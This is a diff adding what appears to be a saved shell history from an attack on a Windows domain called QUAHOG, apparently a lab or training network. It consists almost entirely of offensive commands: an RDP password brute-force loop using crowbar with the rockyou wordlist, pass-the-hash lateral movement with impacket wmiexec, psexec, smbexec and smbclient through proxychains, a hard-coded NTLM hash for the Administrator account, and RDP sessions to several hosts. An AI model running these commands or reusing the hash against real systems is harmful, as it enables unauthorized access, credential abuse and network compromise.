@@ -1,0 +1,35 @@
+
+sudo apt-get update
+sudo apt install -y crowbar
+filename="rockyou.txt"
+passwords=$(cat $filename)
+for pass in $passwords;do crowbar -b rdp -U usernames -c $pass -s 192.168.68.116/32\
+\
+done
+sudo nano /etc/proxychains4.conf 
+impacket-wmiexec -hashes 00000000000000000000000000000000:e1baa61be4dd122db810cda5731c94c1 QUAHOG\Administrator@10.0.01
+proxychains impacket-wmiexec -hashes 00000000000000000000000000000000:e1baa61be4dd122db810cda5731c94c1 QUAHOG\Administrator@10.0.01
+nano /etc/proxychains4.conf
+proxychains impacket-psexec QUAHOG/administrator@10.0.0.2 cmd.exe
+proxychains impacket-smbexec QUAHOG/administrator@10.0.0.2
+proxychains impacket-smbexec -hashes :e1baa61be4dd122db810cda5731c94c1 QUAHOG/administrator@10.0.0.2
+impacket-smbexec -h
+cd ..
+proxychains impacket-psexec -hashes :e1baa61be4dd122db810cda5731c94c1 QUAHOG/administrator@10.0.0.2
+proxychains impacket-smbclient -hashes :e1baa61be4dd122db810cda5731c94c1 QUAHOG/administrator@10.0.0.2
+proxychains impacket-smbexec -hashes :e1baa61be4dd122db810cda5731c94c1 QUAHOG/administrator@10.0.0.2
+ls
+proxychains xfreerdp +drives /u:quahog\\meg-a /v:10.0.0.2:3389
+proxychains impacket-smbexec -hashes :e1baa61be4dd122db810cda5731c94c1 QUAHOG/administrator@10.0.0.3
+proxychains impacket-smbclient -hashes :e1baa61be4dd122db810cda5731c94c1 QUAHOG/administrator@10.0.0.3
+sudo apt-get install freerdp-x11
+sudo apt-get install freerdp
+xfreerdp +drives /u:quahog\chris-a /v:192.168.68.116:3389
+xfreerdp +drives /u:quahog\\chris-a /v:192.168.68.116:3389
+impacket-wmiexec -hashes :e1baa61be4dd122db810cda5731c94c1 QUAHOG/administrator@10.0.0.3
+xfreerdp +drives /u:quahog\\administrator /v:10.0.0.3:3389
+xfreerdp +drives /u:quahog\\administrator /v:10.0.0.1:3389
+xfreerdp +drives /u:quahog\\administrator /v:10.0.0.1:3389
+xfreerdp +drives /u:quahog\\administrator /v:10.0.0.7:3389
+xfreerdp +drives /u:quahog\\administrator /v:10.0.0.2:3389
+xfreerdp +drives /u:quahog\\administrator /v:10.0.0.5:3389
